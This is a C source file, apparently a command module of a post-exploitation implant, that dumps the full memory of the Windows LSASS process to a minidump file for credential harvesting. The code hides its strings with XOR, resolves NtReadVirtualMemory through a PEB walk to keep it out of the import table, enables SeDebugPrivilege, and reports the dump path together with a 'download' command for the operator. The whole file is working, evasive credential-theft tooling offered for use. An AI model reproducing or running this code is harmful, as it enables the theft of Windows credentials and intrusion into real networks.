#include "commands.h"
#include "adv_lazy.h"
#include "evs_strings.h"
#include "peb_walk.h"
#include <windows.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

/* NtReadVirtualMemory — removes ReadProcessMemory from IAT */
typedef NTSTATUS (NTAPI *_lNtRVM_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
static _lNtRVM_t _lsass_nrvm(void) {
    static _lNtRVM_t fn = NULL;
    if (!fn) {
        char fs[24], ns[12]; volatile unsigned char k = EVS_KEY;
        for (int i = 0; i < (int)sizeof(EVS_fn_NtReadVirtualMemory); i++) fs[i] = (char)(EVS_fn_NtReadVirtualMemory[i] ^ k);
        fs[sizeof(EVS_fn_NtReadVirtualMemory)] = '\0';
        for (int i = 0; i < (int)sizeof(EVS_dll_ntdll); i++) ns[i] = (char)(EVS_dll_ntdll[i] ^ k);
        ns[sizeof(EVS_dll_ntdll)] = '\0';
        HMODULE m = _peb_module(ns); SecureZeroMemory(ns, sizeof(ns));
        if (m) fn = (_lNtRVM_t)(void *)GetProcAddress(m, fs);
        SecureZeroMemory(fs, sizeof(fs));
    }
    return fn;
}

/* minidump structures, packed */
#pragma pack(push, 4)

typedef struct { uint32_t Sig; uint16_t Ver; uint16_t ImplVer;
                 uint32_t N;   uint32_t DirRva; uint32_t Csum;
                 uint32_t Ts;  uint64_t Flags; } md_hdr_t;      /* 32 */

typedef struct { uint32_t Sz; uint32_t Rva; } md_loc_t;          /* 8  */
typedef struct { uint32_t Type; md_loc_t Loc; } md_dir_t;        /* 12 */

typedef struct {
    uint16_t Arch; uint16_t Level; uint16_t Rev;
    uint8_t  NCpu; uint8_t ProdType;
    uint32_t Major; uint32_t Minor; uint32_t Build;
    uint32_t Platform; uint32_t CsdRva;
    uint16_t Suite; uint16_t Rsv2;
    uint64_t CpuFeatures[2];
} md_sysinfo_t;  /* 48 */

typedef struct {
    uint64_t Base; uint32_t Size; uint32_t Chk;
    uint32_t Ts;   uint32_t NameRva;
    uint8_t  VerInfo[52];   /* VS_FIXEDFILEINFO — zeroed */
    md_loc_t CvRec; md_loc_t MiscRec;
    uint64_t Rsv0; uint64_t Rsv1;
} md_mod_t;  /* 108 */

typedef struct { uint64_t Start; uint64_t DataSz; } md_range_t;  /* 16 */
typedef struct { uint64_t N; uint64_t BaseRva; } md_mem64_t;       /* 16 */

#pragma pack(pop)

#define MD_STREAM_SYSINFO   7
#define MD_STREAM_MODLIST   4
#define MD_STREAM_MEM64     9

static DWORD _find_lsass(void)
{
    char name[12] = {0};
    { volatile unsigned char _k = EVS_KEY;
      for (int i = 0; i < (int)sizeof(EVS_str_lsass_exe); i++)
          name[i] = (char)(EVS_str_lsass_exe[i] ^ _k); }
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD pid = 0;
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    SecureZeroMemory(name, sizeof(name));
    return pid;
}

static int _is_readable(DWORD prot)
{
    DWORD p = prot & 0xFF;
    return p == PAGE_READONLY          || p == PAGE_READWRITE       ||
           p == PAGE_EXECUTE_READ      || p == PAGE_EXECUTE_READWRITE ||
           p == PAGE_EXECUTE_WRITECOPY || p == PAGE_WRITECOPY;
}

static BOOL _wf(HANDLE hf, const void *d, DWORD sz)
{
    DWORD w;
    return WriteFile(hf, d, sz, &w, NULL) && w == sz;
}

/* ===== Module collection ===== */

#define MAX_MODS 512

typedef struct {
    uint64_t base;
    uint32_t size;
    uint32_t csum;
    uint32_t ts;
    WCHAR    path[MAX_PATH];
    uint32_t path_bytes;   /* byte length of path (no null) */
} lsmod_t;

static int _collect_mods(DWORD pid, HANDLE hp, lsmod_t *mods, int *out)
{
    HANDLE snap = CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snap == INVALID_HANDLE_VALUE) return -1;

    int n = 0;
    MODULEENTRY32 me = {sizeof(me)};
    if (Module32First(snap, &me)) do {
        if (n >= MAX_MODS) break;
        lsmod_t *m = &mods[n++];
        m->base = (uint64_t)(uintptr_t)me.modBaseAddr;
        m->size = me.modBaseSize;
        m->csum = 0;
        m->ts   = 0;

        /* Read PE header for precise timestamps + SizeOfImage */
        BYTE hdr[0x400];
        SIZE_T rd = 0;
        { _lNtRVM_t _r = _lsass_nrvm();
          if (_r) _r(hp, me.modBaseAddr, hdr, sizeof(hdr), &rd); }
        if (rd >= 0x40) {
            IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)(void *)hdr;
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                DWORD ne_off = (DWORD)dos->e_lfanew;
                if (ne_off + sizeof(IMAGE_NT_HEADERS) <= rd) {
                    IMAGE_NT_HEADERS *nt =
                        (IMAGE_NT_HEADERS *)(void *)(hdr + ne_off);
                    if (nt->Signature == IMAGE_NT_SIGNATURE) {
                        m->ts   = nt->FileHeader.TimeDateStamp;
                        m->csum = nt->OptionalHeader.CheckSum;
                        m->size = nt->OptionalHeader.SizeOfImage;
                    }
                }
            }
        }

        int wlen = MultiByteToWideChar(CP_ACP, 0, me.szExePath, -1,
                                        m->path, MAX_PATH);
        m->path_bytes = (wlen > 1) ? (uint32_t)((wlen - 1) * 2) : 0;

    } while (Module32Next(snap, &me));

    CloseHandle(snap);
    *out = n;
    return 0;
}

/* ===== Memory region collection ===== */

#define MAX_REGS 8192

typedef struct { uint64_t start; uint64_t size; } mreg_t;

static int _collect_regs(HANDLE hp, mreg_t *regs, int *out)
{
    int n = 0;
    MEMORY_BASIC_INFORMATION mbi;
    ULONG_PTR addr = 0;

    while (VirtualQueryEx(hp, (LPCVOID)addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        addr = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
        if (mbi.State != MEM_COMMIT) continue;
        if (mbi.Protect & PAGE_GUARD) continue;
        if (!_is_readable(mbi.Protect)) continue;
        if (n >= MAX_REGS) break;
        regs[n].start = (uint64_t)(uintptr_t)mbi.BaseAddress;
        regs[n].size  = (uint64_t)mbi.RegionSize;
        n++;
    }
    *out = n;
    return 0;
}

/* ===== Main dump function ===== */

int cmd_lsassdump(const char *out_path, char *output_buf, size_t output_size)
{
    char dump_path[MAX_PATH + 32];
    if (out_path && out_path[0]) {
        strncpy(dump_path, out_path, sizeof(dump_path) - 1);
        dump_path[sizeof(dump_path) - 1] = '\0';
    } else {
        char tmp[MAX_PATH];
        GetTempPathA(sizeof(tmp), tmp);
        snprintf(dump_path, sizeof(dump_path), "%s%08lx.tmp", tmp, (unsigned long)GetTickCount());
    }

    /* SeDebugPrivilege LUID={20,0} — constant on all NT */
    {
        const adv_api_t *_a = adv_get();
        HANDLE _tok = NULL;
        if (_a->OpenProcessToken && _a->AdjustTokenPrivileges &&
            _a->OpenProcessToken(GetCurrentProcess(),
                                 TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &_tok)) {
            TOKEN_PRIVILEGES _tp;
            _tp.PrivilegeCount = 1;
            _tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            _tp.Privileges[0].Luid.LowPart = 20; _tp.Privileges[0].Luid.HighPart = 0;
            _a->AdjustTokenPrivileges(_tok, FALSE, &_tp, 0, NULL, NULL);
            CloseHandle(_tok);
        }
    }

    DWORD pid = _find_lsass();
    if (!pid) {
        snprintf(output_buf, output_size,
                 "[ld] target not found\n");
        return -1;
    }

    HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                             FALSE, pid);
    if (!hp) {
        snprintf(output_buf, output_size,
                 "[ld] OpenProcess(%lu) failed: %lu\n",
                 (unsigned long)pid, GetLastError());
        return -1;
    }

    lsmod_t *mods = (lsmod_t *)calloc(MAX_MODS, sizeof(lsmod_t));
    mreg_t  *regs = (mreg_t  *)calloc(MAX_REGS, sizeof(mreg_t));
    if (!mods || !regs) {
        free(mods); free(regs); CloseHandle(hp); return -1;
    }

    int n_mods = 0, n_regs = 0;
    _collect_mods(pid, hp, mods, &n_mods);
    _collect_regs(hp, regs, &n_regs);

    /* Total bytes for all MINIDUMP_STRING entries (4-byte aligned) */
    uint32_t str_bytes = 0;
    for (int i = 0; i < n_mods; i++) {
        uint32_t raw = 4 + mods[i].path_bytes + 2; /* len(u32)+wchars+null */
        str_bytes += (raw + 3) & ~3u;
    }

    /*
     * File layout:
     *  [0]       md_hdr_t                     32
     *  [32]      md_dir_t × 3                 36
     *  [68]      md_sysinfo_t                 48
     *  [116]     uint32 n_mods                 4
     *  [120]     md_mod_t × n_mods      n*108
     *  [+str]    MINIDUMP_STRINGs        str_bytes
     *  [+m64h]   md_mem64_t                   16
     *  [+ranges] md_range_t × n_regs    r*16
     *  [+data]   raw memory pages       (BaseRva here)
     */
    uint32_t off_sys    = 68;
    uint32_t off_mlist  = 116;
    uint32_t off_mods   = 120;
    uint32_t off_strs   = off_mods + (uint32_t)n_mods * 108;
    uint32_t off_m64    = off_strs + str_bytes;
    uint32_t off_ranges = off_m64  + 16;
    uint32_t off_data   = off_ranges + (uint32_t)n_regs * 16;

    HANDLE hf = CreateFileA(dump_path, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        free(mods); free(regs); CloseHandle(hp);
        snprintf(output_buf, output_size,
                 "[ld] CreateFile(%s) failed: %lu\n",
                 dump_path, GetLastError());
        return -1;
    }

    /* Header */
    md_hdr_t hdr = {0};
    hdr.Sig    = 0x504d444dUL; /* 'MDMP' */
    hdr.Ver    = 0xA793;
    hdr.N      = 3;
    hdr.DirRva = 32;
    hdr.Ts     = GetTickCount();
    hdr.Flags  = 2; /* MiniDumpWithFullMemory */
    _wf(hf, &hdr, sizeof(hdr));

    /* Directory (3 streams) */
    md_dir_t dirs[3] = {
        {MD_STREAM_SYSINFO,
            {sizeof(md_sysinfo_t), off_sys}},
        {MD_STREAM_MODLIST,
            {4 + (uint32_t)n_mods * 108 + str_bytes, off_mlist}},
        {MD_STREAM_MEM64,
            {16 + (uint32_t)n_regs * 16, off_m64}},
    };
    _wf(hf, dirs, sizeof(dirs));

    /* SystemInfo */
    md_sysinfo_t si = {0};
    si.Arch     = 9;  /* AMD64 */
    si.NCpu     = 1;
    si.Platform = 2;  /* VER_PLATFORM_WIN32_NT */
    OSVERSIONINFOA osi = {sizeof(osi)};
    GetVersionExA(&osi);
    si.Major = osi.dwMajorVersion;
    si.Minor = osi.dwMinorVersion;
    si.Build = osi.dwBuildNumber;
    _wf(hf, &si, sizeof(si));

    /* ModuleList: count */
    uint32_t nm = (uint32_t)n_mods;
    _wf(hf, &nm, 4);

    /* ModuleList: entries */
    uint32_t name_rva = off_strs;
    for (int i = 0; i < n_mods; i++) {
        md_mod_t m = {0};
        m.Base    = mods[i].base;
        m.Size    = mods[i].size;
        m.Chk     = mods[i].csum;
        m.Ts      = mods[i].ts;
        m.NameRva = name_rva;
        _wf(hf, &m, sizeof(m));
        uint32_t raw = 4 + mods[i].path_bytes + 2;
        name_rva += (raw + 3) & ~3u;
    }

    /* ModuleList: MINIDUMP_STRING entries */
    for (int i = 0; i < n_mods; i++) {
        uint32_t len = mods[i].path_bytes;
        _wf(hf, &len, 4);
        _wf(hf, mods[i].path, len + 2);  /* +2: null wchar */
        uint32_t raw    = 4 + len + 2;
        uint32_t padded = (raw + 3) & ~3u;
        if (padded > raw) {
            uint32_t pad = 0;
            _wf(hf, &pad, padded - raw);
        }
    }

    /* Memory64List: header */
    md_mem64_t m64 = {(uint64_t)n_regs, (uint64_t)off_data};
    _wf(hf, &m64, sizeof(m64));

    /* Memory64List: descriptors */
    for (int i = 0; i < n_regs; i++) {
        md_range_t r = {regs[i].start, regs[i].size};
        _wf(hf, &r, sizeof(r));
    }

    /* Memory data — read LSASS pages and write sequentially */
    BYTE *rbuf = (BYTE *)malloc(0x10000);
    if (rbuf) {
        for (int i = 0; i < n_regs; i++) {
            uint64_t  left   = regs[i].size;
            ULONG_PTR cursor = (ULONG_PTR)regs[i].start;
            while (left > 0) {
                SIZE_T chunk = (SIZE_T)(left > 0x10000 ? 0x10000 : left);
                SIZE_T rd    = 0;
                { _lNtRVM_t _r = _lsass_nrvm();
                  if (_r) _r(hp, (PVOID)cursor, rbuf, chunk, &rd); }
                if (!rd) {
                    memset(rbuf, 0, chunk);
                    rd = chunk;
                }
                _wf(hf, rbuf, (DWORD)rd);
                cursor += rd;
                left   -= rd;
            }
        }
        free(rbuf);
    }

    CloseHandle(hf);
    CloseHandle(hp);
    free(mods);
    free(regs);

    LARGE_INTEGER fsz = {0};
    HANDLE hf2 = CreateFileA(dump_path, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    if (hf2 != INVALID_HANDLE_VALUE) {
        GetFileSizeEx(hf2, &fsz);
        CloseHandle(hf2);
    }

    snprintf(output_buf, output_size,
             "[ld] ok  pid=%lu  mods=%d  regions=%d\n"
             "  path: %s  (%llu bytes)\n"
             "  download: download %s\n",
             (unsigned long)pid, n_mods, n_regs,
             dump_path, (unsigned long long)fsz.QuadPart,
             dump_path);
    return 0;
}
